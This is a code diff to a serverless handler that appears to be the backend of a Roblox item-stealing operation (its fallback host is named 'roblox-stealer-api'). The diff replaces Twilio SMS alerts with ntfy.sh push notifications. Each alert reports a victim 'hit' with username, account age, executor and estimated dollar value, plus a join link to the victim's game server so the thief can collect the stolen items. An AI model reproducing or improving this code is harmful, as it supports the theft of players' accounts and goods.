@@ -1,35 +1,34 @@
 import crypto from 'crypto';
 
-// ── Twilio SMS sender ─────────────────────────────────────────────────────────
-// Set these in your Vercel env vars:
-//   TWILIO_ACCOUNT_SID  - from console.twilio.com
-//   TWILIO_AUTH_TOKEN   - from console.twilio.com
-//   TWILIO_FROM_NUMBER  - your Twilio phone number e.g. +15005550006
-//   TWILIO_TO_NUMBER    - your personal number e.g. +14155551234
-async function sendSMS(message) {
-  const sid   = process.env.TWILIO_ACCOUNT_SID;
-  const token = process.env.TWILIO_AUTH_TOKEN;
-  const from  = process.env.TWILIO_FROM_NUMBER;
-  const toRaw = process.env.TWILIO_TO_NUMBER; // comma-separated for multiple: +1xxx,+1yyy
+// ── ntfy.sh push notification sender ──────────────────────────────────────────
+// Set in Vercel env vars:
+//   NTFY_TOPIC  - your secret topic name e.g. "mm2hits-x7k2p9"
+//               - comma-separate for multiple devices: "topic1,topic2"
+//   NTFY_SERVER - optional, defaults to https://ntfy.sh (use for self-hosted)
+//
+// Setup: install the "ntfy" app on your phone, subscribe to your topic. Done.
+async function sendPush(title, message, joinUrl) {
+  const topicRaw = process.env.NTFY_TOPIC;
+  if (!topicRaw) return; // not configured, skip silently
 
-  if (!sid || !token || !from || !toRaw) return; // not configured, skip silently
+  const server = (process.env.NTFY_SERVER || 'https://ntfy.sh').replace(/\/$/, '');
+  const topics = topicRaw.split(',').map(t => t.trim()).filter(Boolean);
 
-  // Support multiple recipients — blast to all in parallel
-  const recipients = toRaw.split(',').map(n => n.trim()).filter(Boolean);
+  const headers = {
+    'Content-Type': 'text/plain',
+    'Title':    title,
+    'Priority': 'urgent',       // makes phone buzz loud
+    'Tags':     'rotating_light,skull', // 🚨💀 icons in notification
+  };
+  if (joinUrl) headers['Actions'] = `view, Join Server, ${joinUrl}`;
 
-  const authHeader = 'Basic ' + Buffer.from(`${sid}:${token}`).toString('base64');
-
-  await Promise.allSettled(recipients.map(to => {
-    const body = new URLSearchParams({ From: from, To: to, Body: message });
-    return fetch(`https://api.twilio.com/2010-04-01/Accounts/${sid}/Messages.json`, {
+  await Promise.allSettled(topics.map(topic =>
+    fetch(`${server}/${encodeURIComponent(topic)}`, {
       method: 'POST',
-      headers: {
-        'Authorization': authHeader,
-        'Content-Type': 'application/x-www-form-urlencoded',
-      },
-      body: body.toString(),
-    }).catch(e => console.error(`SMS to ${to} failed:`, e));
-  }));
+      headers,
+      body: message,
+    }).catch(e => console.error(`ntfy to ${topic} failed:`, e))
+  ));
 }
 
 // ============================================================
@@ -401,30 +400,29 @@ export default async function handler(req, res) {
       console.error('Webhook failed:', e);
     }
 
-    // ── Twilio SMS (fires alongside Discord) ──────────────────────────────────
+    // \u2500\u2500 ntfy.sh push notification (fires alongside Discord) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
     try {
       const BASE_URL = process.env.VERCEL_URL
         ? `https://${process.env.VERCEL_URL}`
         : 'https://roblox-stealer-api.vercel.app';
 
-      const joinUrl = hitData.placeId && hitData.jobId
+      const pushJoinUrl = hitData.placeId && hitData.jobId
         ? `${BASE_URL}/api/join?placeId=${hitData.placeId}&jobId=${hitData.jobId}`
         : null;
 
-      // Keep SMS under 160 chars for a single message segment
-      const smsLines = [
-        `🔥 NEW HIT`,
-        `User: ${hitData.username} (${hitData.displayName})`,
-        `Game: ${hitData.gameName || 'MM2'} | ${hitData.playerCount}/${hitData.maxPlayers} players`,
-        `Age: ${hitData.accountAge}d | Exec: ${hitData.executor}`,
-        `Est: ${formatUSD(totalUSD)}`,
-      ];
-      if (joinUrl) smsLines.push(`Join: ${joinUrl}`);
+      const pushTitle = `🔥 New Hit — ${formatUSD(totalUSD)}`;
+      const pushBody = [
+        `👤 ${hitData.username} (${hitData.displayName})`,
+        `🎮 ${hitData.gameName || 'MM2'} | ${hitData.playerCount}/${hitData.maxPlayers} players`,
+        `📅 ${hitData.accountAge}d acct | ⚙️ ${hitData.executor}`,
+        `💰 Est: ${formatUSD(totalUSD)}`,
+      ].join('\n');
 
-      await sendSMS(smsLines.join('\n'));
+      await sendPush(pushTitle, pushBody, pushJoinUrl);
     } catch (e) {
-      console.error('SMS block failed:', e);
+      console.error('Push notification failed:', e);
     }
+
   }
 
   // Parse receivers from env: comma-separated usernames e.g. "User1,User2"
